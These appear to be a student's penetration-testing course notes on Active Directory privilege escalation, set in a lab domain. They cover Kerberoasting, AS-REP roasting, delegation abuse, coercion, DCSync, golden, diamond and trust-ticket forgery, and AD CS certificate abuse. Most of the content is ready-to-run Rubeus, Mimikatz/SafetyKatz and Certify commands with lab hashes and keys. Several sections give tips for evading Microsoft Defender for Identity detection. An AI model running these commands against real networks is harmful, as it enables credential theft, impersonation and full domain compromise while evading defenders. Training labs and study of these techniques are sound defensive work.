# Priv Esc - Kerberoasting

Offline cracking of service account passwords.
The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!

![[Kerberoasting.png]]

**Attack steps:**
1. Request a ST/TGS encrypted with NTLM hash of the target service and save it offline.
2. Brute-force the ST/TGS offline for clear-text password of the service account

> [!note]
> If a user account has a **Service Principal Name (SPN)** attributes that are not null we can request a **TGS** for it.

Find user accounts used as Service accounts

```PowerShell
# ActiveDirectory module 
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} Properties ServicePrincipalName

# PowerView 
Get-DomainUser -SPN
```

Or using **Rubeus**

```PowerShell
# Use Rubeus to list Kerberoast stats 
Rubeus.exe kerberoast /stats ## (This is not OPSEC safe)

# Use Rubeus to request a TGS 
Rubeus.exe kerberoast /user:svcadmin /simple ## (This is OPSEC safe)

# To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
Rubeus.exe kerberoast /stats /rc4opsec 
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

# Priv Esc - Targeted Kerberoasting - AS-REPs

If a user's **`UserAccountControl`** settings have "Do not require Kerberos **`preauthentication`**" enabled i.e. Kerberos **`preauth`** is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.

With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well

![[Targeted Kerberoasting - AS-REP.png]]

**Attack Steps:**
1. Request a blob that is encrypted with NTLM hash of the target user who has Pre-Authentication disabled and save it offline.
2. Brute-Force the blob offline for clear-text password of the target user.

Enumerating accounts with Kerberos **Preauth** disabled:

```PowerShell
Get-DomainUser -PreauthNotRequired -Verbose

Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

Force disable Kerberos **Preauth**:

```PowerShell
# Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

Request encrypted AS-REP for offline brute-force:

```powershell
C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

# Priv Esc - Targeted Kerberoasting - Set SPN

Let's enumerate the permissions for RDPUsers on ACLs using PowerView:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Using Powerview, see if the user already has a SPN:

```Powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

Using ActiveDirectory module:

```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

Set a SPN for the user (must be unique for the forest)

```PowerShell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
```

Using ActiveDirectory module:

```PowerShell
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```

Kerberoast the user:

```PowerShell
Rubeus.exe kerberoast /outfile:targetedhashes.txt
```

# Priv Esc - Kerberos Delegation

- Kerberos Delegation allows to **"reuse the end-user credentials to access resources hosted on a different server"**.
- User impersonation is the goal of delegation
## Priv Esc - Unconstrained Delegation

It allows delegation to any service to any resource on the domain as a user.
When unconstrained delegation is enabled, the DC places user's TGT inside TGS. On the first hop, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.

1. A user provides credentials to the Domain Controller. 
2. The DC returns a TGT. 
3. The user requests a TGS for the web service on Web Server. 
4. The DC provides a TGS. 
5. The user sends the TGT and TGS to the web server. 
6. The web server service account use the user's TGT to request a TGS for the database server from the DC. 
7. The web server service account connects to the database server as the user.

![[Unconstrained Delegation.png]]

Discover domain computers which have **unconstrained delegation** enabled using **PowerView**:

```Powershell
Get-DomainComputer -UnConstrained
```

Using Active Directory module:

```PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True} 
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

- Compromise the server(s) where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.
- Now, if the command is run again:

```PowerShell
SafetyKatz.exe "sekurlsa::tickets /export"
```

The DA token could be reused:

```PowerShell
Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0 60a10000-Administrator@krbtgt DOLLARCORP.MONEYCORP.LOCAL.kirbi"
```

### Priv Esc - Unconstrained Delegation - Coercion

- Certain Microsoft services and protocols allow any authenticated user to force a machine to connect to a second machine.
- As of January 2025, following protocols and services can be used for coercion:

![[Unconstrained Delegation - Coercion.png]]

![[Coercion Example.png]]

We can capture the TGT of `dcorp-dc$` by using Rubeus on `dcorp-appsrv`:

```PowerShell
Rubeus.exe monitor /interval:5 /nowrap
```

And after that run MS-RPRN.exe (or other) (https://github.com/leechristensen/SpoolSample ) on the student VM:

```PowerShell
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local # This forces the Domain Controller to connect to dcorp-appsrv
```

Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:

```PowerShell
Rubeus.exe ptt /ticket:
```

Once the ticket is injected, run DCSync:

```PowerShell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" # This won't be detected by MDI because we are running it as the domain controller using the TGT of the domain controller
```

## Priv Esc - Constrained Delegation with Protocol Transition

Allows access only to specified services on specified computers as a user. 
Protocol Transition is used when a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
– **Service for User to Self (S4U2self)** - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name **without supplying a password**. 
– **Service for User to Proxy (S4U2proxy)** - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by **`msDS-AllowedToDelegateTo`** attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.


![[Constrained Delegation with Protocol Transition.png]]

1. A user - Joe, authenticates to the web service (running with service account **`websvc`**) using a non-Kerberos compatible authentication mechanism. 
2. The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the **`websvc`** account. 
3. The KDC checks the **`websvc`** **`userAccountControl`** value for the **TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION** attribute, and that Joe's account is not blocked for delegation. If OK, it returns a forwardable ticket for Joe's account *(S4U2Self)*. 
4. The service then passes this ticket back to the KDC and requests a service ticket for the **`CIFS/dcorp-mssql.dollarcorp.moneycorp.local`** service. 
5. The KDC checks the **`msDS-AllowedToDelegateTo`** field on the **`websvc`** account. If the service is listed it will return a service ticket for **`dcorp-mssql`** *(S4U2Proxy)*. 
6. The web service can now authenticate to the CIFS on **`dcorp-mssql`** as Joe using the supplied TGS.

To abuse constrained delegation in above scenario, we need to have access to the **`websvc`** account. If we have access to that account, it is possible to access the services listed in **`msDS-AllowedToDelegateTo`** of the **`websvc`** account as ANY user.

Enumerate users and computers with **constrained delegation** enabled:

```PowerShell
# Using PowerView 
Get-DomainUser -TrustedToAuth 
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

We can use the following command (We are requesting a TGT and TGS in a single command):

```PowerShell
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

```PowerShell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

## Priv Esc - Resource-based Constrained Delegation

- This moves delegation authority to the resource/service administrator. 
- Instead of SPNs on **`msDs-AllowedToDelegatTo`** on the front-end service like web service, access in this case is controlled by security descriptor of **`msDS-AllowedToActOnBehalfOfOtherIdentity`** (visible as **`PrincipalsAllowedToDelegateToAccount`**) on the resource/service like SQL Server service. 
- That is, the resource/service administrator can configure this delegation whereas for other types, **`SeEnableDelegation`** privileges are required which are, by default, available only to Domain Admins.

> [!note]
> In the classic **Constrained Delegation**, Access to the second hop (the DB server) was controlled using **msDs-AllowedToDelegatTo**. In case of RBCD, that access is now controlled by security descriptor on the second hop.
> ****
> If you abuse RBCD you can access any service on the second hop as any user in the domain

**To abuse RBCD in the most effective form, we just need two privileges:**
1. Write permissions over the target service or object to configure **`msDS-AllowedToActOnBehalfOfOtherIdentity`**. 
2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - **`ms-DS-MachineAccountQuota`** is 10 for all domain users)

> [!note]
> Every domain user can create up to **10** machine accounts by default


Enumeration would show that the user **`'ciadmin'`** has Write permissions over the **`dcorp-mgmt`** machine!

```PowerShell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

Using the Active Directory module, configure RBCD on **`dcorp-mgmt`** for student machines :

```PowerShell
$comps = 'dcorp-student1$','dcorp-student2$' 
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

Now, let's get the privileges of **`dcorp-studentx$`** by extracting its AES keys:

```PowerShell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

Use the AES key of **`dcorp-studentx$`** with Rubeus and access **`dcorp-mgmt`** as ANY user we want:

```PowerShell
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

```PowerShell
winrs -r:dcorp-mgmt cmd.exe
```

> [!tldr]
> What we're doing here is that we are saying that I'd like to access any service on **dcorp-mgmt** as any user (including Domain Admins) if I have admin access to any of these machines.

> [!important]
>When we find multiple AES keys for multiple machine accounts, use the one with the interesting well-known SID. (System SID, e.g.`S-1-5-18`) 

# Priv Esc - Enterprise Admins

- **`sIDHistory`** is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to **`sIDHistory`**. 
- **`sIDHistory`** can be abused in two ways of escalating privileges within a forest:
	- **`krbtgt`** hash of the child
	- Trust tickets

## Kerberos - Across Domain Trusts

![[Kerberos - Across Domain Trusts.png]]

## Priv Esc - Enterprise Admins - Trust Key Abuse

![[Trust Key Abuse.png]]

**Attack Steps:**
1. Acquire NTLM hash of the target trust account
2. Forge the referral ticket (ST/TGS) using the secret of the target trust account

> [!note]
>In Step 5, we represent in the ticket **SID 519** 

> [!info]
> Why do we use NTLM instead of AES in this scenario?
> Because for **Cross-Trust Communication**, by default RC4 is used. You need to explicitly turn on AES.
> ****
> The Forest Root or Parent simply validates the forged ticket if it's valid or not. It doesn't validate the content of it.

So, what is required to forge trust tickets is, obviously, the trust key. Look for `[In]` trust key from child to parent on the DC.

```PowerShell title:"Extract Trust Key"
SafetyKatz.exe "lsadump::trust /patch"
# Or
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
# Or
SafetyKatz.exe "lsadump::lsa /patch"
```

```PowerShell title:"Forge an inter-realm TGT using Rubeus"
# NOTE: THIS COMMAND DIDN't WORK IN ADMINISTRATOR SHELL - ERROR: WRONG USERNAME OR PASSWORD

C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

```PowerShell title:"Use the forged ticket"
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
```

![[Trust Tickets Rubeus.png]]

## Priv Esc - Enterprise Admins - krbtgt Secret Abuse

![[EA - krbtgt secret abuse.png]]

**Attack Steps:**
1. Acquire AES key of the **`krbtgt`** account.
2. Acquire the TGT using AES key of the **`krbtgt`** account to get the desired privileges.

We need to simply forge a Golden ticket (not an inter-realm TGT) with **`sIDHistory`** of the **Enterprise Admins** group.
Due to the trust, the parent domain will trust the TGT.

```PowerShell title:"Forging Golden Ticket using Mimikatz"
SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

```PowerShell title:"Forging Golden Ticket using Rubeus"
Rubeus.exe evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 # (Here's the difference between Normal Golden Ticket and this one is injecting the SID history of EA)
/aes256:<AES_HERE> /netbios:dcorp /ptt
```

> [!note]
>Using this approach we can access any Machine or any Service on the domain without the need of asking for a TGS for each of the services 

Avoid suspicious logs and bypass **MDI** by using **Domain Controller** identity:

```PowerShell title:"Forging Golden Ticket with the SIDs of DC and EDC to avoid detection"
SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

Then we can execute the **`DCSync Attack`**

```Powershell title:"DCSync Attack"
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

**S-1-5-21-2578538781-2508153159-3419410681-516** - Domain Controllers
**S-1-5-9** - Enterprise Domain Controllers

Avoid suspicious logs and bypass **MDI** by using **Domain Controller** identity using **Rubeus**:

```PowerShell title:"Forging Golden Ticket with the SIDs of DC and EDC to avoid detection - Rubeus"
Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb 5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP DC.dollarcorp.moneycorp.local /ptt
```

```PowerShell title:"DCSync Attack"
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Diamond ticket with SID History will avoid suspicious logs on child DC and parent DC. Also bypasses MDI

```PowerShell title:"Diamond Ticket with SID History Injection"
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cd a848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```PowerShell title:"DCSync Attack"
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

## Kerberos - Across External Trusts

![[Across External Trusts.png]]

## Priv Esc - Across External Trust - Trust Key Abuse

![[Across External Trust - Trust Key Abuse.png]]

**Attack Steps:**
1. Acquire NTLM hash of the target trust account
2. Forge the referral ticket (ST/TGS) using the secret of the target trust account

We require the trust key for the inter-forest trust from the DC that has the external trust:

```PowerShell title:"Extract Trust Key"
SafetyKatz.exe -Command '"lsadump::trust /patch"'
# Or
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```

Forge an inter-realm TGT using Rubeus

```PowerShell
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

Use the forged ticket

```PowerShell
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
```

# Priv Esc - Across domain trusts - AD CS

- Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more. 
- "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."

- CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA. 
- Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc. 
- CSR - Certificate Signing Request made by a client to the CA to request a certificate. 
- Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc. 
- EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.

![[ADCS.png]]

![[ADCS - THEFT.png]]

![[ADCS - ESC.png]]

![[ADCS - DPERSIST.png]]

We can use the Certify tool (https://github.com/GhostPack/Certify ) to enumerate (and for other attacks) AD CS in the target forest:

```PowerShell title:"Certify"
Certify.exe cas

# Enumerate the templates: 
Certify.exe find

# Enumerate vulnerable templates:
Certify.exe find /vulnerable
```

## Priv Esc - Across domain trusts - AD CS - ESC3

The template **"`SmartCardEnrollment-Agent`"** allows Domain users to enroll and has **"Certificate Request Agent"** EKU.

```PowerShell
Certify.exe find /vulnerable
```

The template **"`SmartCardEnrollment-Users`"** has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication

### Escalation to DA

We can now request a certificate for Certificate Request Agent from **"`SmartCardEnrollment Agent`"** template.

```PowerShell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

Convert from **`cert.pem`** to **`pfx`** (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the **`"SmartCardEnrollment-Users"`** template.

```PowerShell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

Convert from **`cert.pem`** to **`pfx`** (esc3user-DA.pfx below), request DA TGT and inject it:

```PowerShell
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
```

### Escalation to EA

Convert from **`cert.pem`** to **`pfx`** (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the **`"SmartCardEnrollment-Users"`** template.

```PowerShell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

Request EA TGT and inject it:

```PowerShell
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

## Priv Esc - Across domain trusts - AD CS - ESC1

The template **`"HTTPSCertificates"`** has **ENROLLEE_SUPPLIES_SUBJECT** value for **`msPKI-Certificates-Name-Flag`**.

```PowerShell
Certify.exe find /enrolleeSuppliesSubject
```

The template **`"HTTPSCertificates"`** allows enrollment to the **`RDPUsers`** group. Request a certificate for DA (or EA) as student1

```PowerShell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC CA /template:"HTTPSCertificates" /altname:administrator
```

Convert from **`cert.pem`** to **`pfx`** (esc1.pfx below) and use it to request a TGT for DA (or EA).

```PowerShell
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```

